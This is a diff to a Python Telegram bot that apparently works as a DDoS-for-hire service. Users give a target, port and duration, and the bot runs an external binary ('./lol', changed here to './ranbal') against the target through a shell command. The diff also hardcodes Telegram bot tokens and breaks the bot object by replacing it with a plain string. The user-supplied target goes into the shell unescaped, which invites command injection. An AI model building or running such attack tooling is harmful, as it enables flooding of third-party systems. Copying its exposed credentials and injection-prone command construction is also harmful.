@@ -4,7 +4,7 @@ import datetime
 import os
 
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('7083053513:AAHTh6d2cKG3Gn8PxfpeERZ07NwuTlhby4M')
+bot = ('7404886490:AAEybvV4lTt2Tg_uN0nau4tGqgx4C6XlIgY')
 
 # Admin user IDs
 admin_id = {"1163610781"}
@@ -300,7 +300,7 @@ def handle_attack(message):
                     start_attack_reply(message, target, port, time)
 
                     # Simulate attack process
-                    full_command = f"./lol {target} {port} {time} 2000"
+                    full_command = f"./ranbal {target} {port} {time} 900"
                     subprocess.run(full_command, shell=True)
 
                     response = "Attack completed successfully."
@@ -447,3 +447,4 @@ while True:
         bot.polling(none_stop=True)
     except Exception as e:
         print(e)
+
